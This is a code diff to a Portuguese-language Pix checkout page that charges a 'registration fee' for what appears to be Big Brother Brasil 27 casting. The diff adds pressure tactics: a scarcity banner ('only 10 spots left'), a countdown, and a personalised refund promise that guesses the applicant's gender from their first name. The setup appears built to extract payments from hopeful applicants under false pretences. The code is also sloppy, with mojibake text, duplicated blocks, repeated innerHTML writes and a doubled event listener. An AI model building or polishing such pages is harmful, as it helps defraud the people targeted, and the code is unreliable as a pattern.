@@ -41,7 +41,7 @@
           </div>
         </div>
 
-        <div class="payment-panel">
+        <div class="payment-panel" hidden aria-hidden="true">
           <h2>Forma de pagamento</h2>
           <div class="pix-only">
             <img src="assets/pix-logo.png" alt="Pix">
@@ -56,6 +56,10 @@
           <div class="pix-urgency-bar">
             <strong>Apenas 10 vagas restantes</strong>
             <span>Conclua em <b id="payment-countdown-inline">05:00</b></span>
+            <small class="pix-refund-note">
+              <span class="pix-refund-label">Aviso</span>
+              <span><b>Importante:</b> <span id="pix-refund-name">Maria</span>, caso não seja selecionada(o), o valor da taxa será reembolsado para sua conta.</span>
+            </small>
           </div>
           <img id="pix-qr" alt="QR Code Pix" hidden>
           <label>
@@ -64,6 +68,28 @@
           </label>
           <button id="copy-pix" class="copy-pix" type="button">Copiar código Pix</button>
           <p id="payment-status" class="payment-status">Aguardando pagamento...</p>
+        </div>
+
+        <!-- removed duplicated broken fee-details block -->
+          <div>
+            <span id="primary-detail-label-original">Candidato</span>
+            <strong id="fee-name-original">NÃ£o informado</strong>
+          </div>
+          <div>
+            <span id="secondary-detail-label-original">RegiÃ£o</span>
+            <strong id="fee-region-original">NÃ£o informada</strong>
+          </div>
+        </div>
+
+        <!-- removed duplicated broken payment-panel block -->
+          <h2>Forma de pagamento</h2>
+          <div class="pix-only">
+            <img src="assets/pix-logo.png" alt="Pix">
+            <div>
+              <span>Pagamento via Pix</span>
+              <small id="pix-helper-original">Pagamento instantÃ¢neo para finalizar a sua inscriÃ§Ã£o.</small>
+            </div>
+          </div>
         </div>
 
         <p id="payment-error" class="payment-error" hidden></p>
@@ -102,6 +128,7 @@
         regiao: storedData.regiao || params.get("regiao") || "Não informada",
         cidade: storedData.cidade || "",
         endereco: storedData.endereco || "",
+        genero: storedData.genero || storedData.sexo || params.get("genero") || params.get("sexo") || "",
       };
 
       const checkoutImage = document.querySelector("#checkout-image");
@@ -124,12 +151,67 @@
       const paymentError = document.querySelector("#payment-error");
       const paymentCountdown = document.querySelector("#payment-countdown");
       const paymentCountdownInline = document.querySelector("#payment-countdown-inline");
+      const pixRefundName = document.querySelector("#pix-refund-name");
+      const pixRefundMessage = document.querySelector(".pix-refund-note > span:last-child");
+      const pixCodeLabel = document.querySelector("#pix-result label");
+      const paymentPanel = document.querySelector(".payment-panel");
       let statusPollTimer = null;
       let countdownTimer = null;
+
+      document.querySelector("#primary-detail-label-original")?.closest("div")?.remove();
+      document.querySelector("#secondary-detail-label-original")?.closest("div")?.remove();
+      document.querySelector("#fee-name-original")?.closest("div")?.remove();
+      document.querySelector("#fee-region-original")?.closest("div")?.remove();
+      const brokenPixHelper = document.querySelector("#pix-helper-original");
+      if (brokenPixHelper) {
+        brokenPixHelper.closest(".pix-only")?.remove();
+        const strayHeading = document.querySelector('.fee-card > h2');
+        strayHeading?.remove();
+      }
+      paymentPanel?.remove();
+
+      const uiText = {
+        pageTitle: "BBB 27 - Taxa de inscri\u00e7\u00e3o",
+        kicker: "\u00daltima etapa da inscri\u00e7\u00e3o",
+        title: "Taxa de inscri\u00e7\u00e3o",
+        summary: "Seus dados foram preenchidos com sucesso. Para finalizar a inscri\u00e7\u00e3o, realize o pagamento da taxa abaixo.",
+        region: "Regi\u00e3o",
+        pixHelper: "Pagamento instant\u00e2neo para finalizar a sua inscri\u00e7\u00e3o.",
+        pixCodeLabel: "C\u00f3digo Pix copia e cola",
+        copyPix: "Copiar c\u00f3digo Pix",
+        backForm: "Voltar ao formul\u00e1rio",
+        productPixHelper: "Pagamento instant\u00e2neo para concluir a compra do \u00e1lbum.",
+        backAlbum: "Voltar ao \u00e1lbum",
+      };
+
+      function applyUiText() {
+        document.title = uiText.pageTitle;
+        feeKicker.textContent = uiText.kicker;
+        feeTitle.textContent = uiText.title;
+        feeSummary.textContent = uiText.summary;
+        primaryDetailLabel.textContent = "Candidato";
+        secondaryDetailLabel.textContent = uiText.region;
+        if (pixHelper) pixHelper.textContent = uiText.pixHelper;
+        pixCodeLabel.firstChild.textContent = uiText.pixCodeLabel;
+        copyPix.textContent = uiText.copyPix;
+        backLink.textContent = uiText.backForm;
+      }
+
+      document.title = "BBB 27 - Taxa de inscrição";
+      feeKicker.textContent = "Última etapa da inscrição";
+      feeTitle.textContent = "Taxa de inscrição";
+      feeSummary.textContent = "Seus dados foram preenchidos com sucesso. Para finalizar a inscrição, realize o pagamento da taxa abaixo.";
+      primaryDetailLabel.textContent = "Candidato";
+      secondaryDetailLabel.textContent = "Região";
+      pixHelper.textContent = "Pagamento instantâneo para finalizar a sua inscrição.";
+      pixCodeLabel.firstChild.textContent = "Código Pix copia e cola";
+      copyPix.textContent = "Copiar código Pix";
+      backLink.textContent = "Voltar ao formulário";
 
       checkoutImage.src = checkoutItem.image;
       amountValue.textContent = checkoutItem.formattedPrice;
       backLink.href = checkoutItem.returnUrl;
+      applyUiText();
 
       if (selectedProduct) {
         checkoutImage.alt = selectedProduct.title;
@@ -148,6 +230,53 @@
         feeName.textContent = applicationData.nome;
         feeRegion.textContent = applicationData.regiao;
       }
+
+      if (!feeName.textContent || feeName.textContent.includes("NÃ")) {
+        feeName.textContent = "N\u00e3o informado";
+      }
+
+      if (!feeRegion.textContent || feeRegion.textContent.includes("NÃ")) {
+        feeRegion.textContent = "N\u00e3o informada";
+      }
+
+      function inferGenderLabel() {
+        const rawGender = String(applicationData.genero || "").trim().toLowerCase();
+        if (["f", "feminino", "feminina", "mulher", "female"].includes(rawGender)) {
+          return "selecionada";
+        }
+        if (["m", "masculino", "masculina", "homem", "male"].includes(rawGender)) {
+          return "selecionado";
+        }
+
+        const firstNameNormalized = (applicationData.nome || "")
+          .trim()
+          .split(/\s+/)[0]
+          .normalize("NFD")
+          .replace(/[\u0300-\u036f]/g, "")
+          .toLowerCase();
+
+        const masculineExceptions = new Set([
+          "kaio", "caio", "joao", "joa", "elias", "lucas", "mateus", "matheus",
+          "nicolas", "marcos", "caua", "noa", "akira", "joshua", "baruch", "asa"
+        ]);
+
+        if (masculineExceptions.has(firstNameNormalized)) {
+          return "selecionado";
+        }
+
+        if (firstNameNormalized.endsWith("a")) {
+          return "selecionada";
+        }
+
+        return "selecionado";
+      }
+
+      const firstName = (applicationData.nome || "").trim().split(/\s+/)[0] || "Maria";
+      pixRefundName.textContent = firstName;
+      pixRefundMessage.innerHTML = `<b>Importante:</b> ${firstName}, caso n\u00e3o seja selecionada(o), o valor da taxa ser\u00e1 reembolsado para sua conta.`;
+      pixRefundMessage.innerHTML = `<b>Importante:</b> ${firstName}, caso não seja selecionada(o), o valor da taxa será reembolsado para sua conta.`;
+
+      pixRefundMessage.innerHTML = `<b>Importante:</b> ${firstName}, caso n\u00e3o seja ${inferGenderLabel()}, o valor da taxa ser\u00e1 reembolsado para sua conta.`;
 
       function normalizeQrCode(base64) {
         if (!base64) return "";
@@ -274,6 +403,12 @@
 
       copyPix.addEventListener("click", async () => {
         await navigator.clipboard.writeText(pixCode.value);
+        copyPix.textContent = "Código copiado";
+        window.setTimeout(() => {
+          copyPix.textContent = "Copiar código Pix";
+        }, 1800);
+      });
+      copyPix.addEventListener("click", () => {
         copyPix.textContent = "Código copiado";
         window.setTimeout(() => {
           copyPix.textContent = "Copiar código Pix";
